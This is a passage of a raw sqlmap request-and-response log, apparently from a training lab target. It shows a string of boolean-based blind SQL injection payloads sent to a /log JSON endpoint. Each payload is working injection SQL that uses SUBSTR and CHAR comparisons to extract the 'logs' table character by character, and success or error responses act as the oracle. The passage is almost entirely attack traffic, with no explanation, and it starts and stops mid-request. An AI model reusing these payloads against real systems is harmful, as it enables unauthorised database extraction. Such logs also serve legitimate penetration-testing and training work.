+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),20,1)>CHAR(96))||'"}
+
+HTTP response [#103] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:36 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#104]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 166
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),20,1)>CHAR(112))||'"}
+
+HTTP response [#104] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:36 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#105]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 166
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),20,1)>CHAR(104))||'"}
+
+HTTP response [#105] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:36 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#106]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 166
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),20,1)>CHAR(100))||'"}
+
+HTTP response [#106] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:37 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#107]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 166
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),20,1)>CHAR(102))||'"}
+
+HTTP response [#107] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:37 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#108]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 166
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),20,1)>CHAR(101))||'"}
+
+HTTP response [#108] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:38 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#109]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),21,1)>CHAR(96))||'"}
+
+HTTP response [#109] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:38 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#110]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),21,1)>CHAR(49))||'"}
+
+HTTP response [#110] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:38 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#111]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),21,1)>CHAR(72))||'"}
+
+HTTP response [#111] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:39 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#112]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),21,1)>CHAR(60))||'"}
+
+HTTP response [#112] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:39 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#113]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),21,1)>CHAR(54))||'"}
+
+HTTP response [#113] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:39 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#114]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),21,1)>CHAR(57))||'"}
+
+HTTP response [#114] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:40 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#115]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),21,1)>CHAR(55))||'"}
+
+HTTP response [#115] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:40 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#116]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),22,1)>CHAR(47))||'"}
+
+HTTP response [#116] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:40 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#117]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),22,1)>CHAR(87))||'"}
+
+HTTP response [#117] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:41 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#118]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),22,1)>CHAR(67))||'"}
+
+HTTP response [#118] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:41 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#119]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),22,1)>CHAR(57))||'"}
+
+HTTP response [#119] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:41 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#120]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),22,1)>CHAR(52))||'"}
+
+HTTP response [#120] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:41 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#121]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),22,1)>CHAR(49))||'"}
+
+HTTP response [#121] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:42 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#122]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),22,1)>CHAR(48))||'"}
+
+HTTP response [#122] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:42 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#123]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),23,1)>CHAR(47))||'"}
+
+HTTP response [#123] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:43 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#124]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),23,1)>CHAR(87))||'"}
+
+HTTP response [#124] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:43 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#125]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 166
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),23,1)>CHAR(107))||'"}
+
+HTTP response [#125] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:43 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#126]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),23,1)>CHAR(97))||'"}
+
+HTTP response [#126] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:44 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#127]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 166
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),23,1)>CHAR(102))||'"}
+
+HTTP response [#127] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:44 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#128]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),23,1)>CHAR(99))||'"}
+
+HTTP response [#128] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:44 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#129]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),23,1)>CHAR(98))||'"}
+
+HTTP response [#129] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:45 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#130]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),24,1)>CHAR(96))||'"}
+
+HTTP response [#130] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:45 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#131]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),24,1)>CHAR(49))||'"}
+
+HTTP response [#131] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:45 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#132]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 164
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),24,1)>CHAR(1))||'"}
+
+HTTP response [#132] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:46 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#133]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),24,1)>CHAR(26))||'"}
+
+HTTP response [#133] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:46 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#134]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),24,1)>CHAR(37))||'"}
+
+HTTP response [#134] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:47 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#135]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),24,1)>CHAR(43))||'"}
+
+HTTP response [#135] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:47 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#136]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),24,1)>CHAR(46))||'"}
+
+HTTP response [#136] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:48 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#137]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),24,1)>CHAR(47))||'"}
+
+HTTP response [#137] (200 OK):
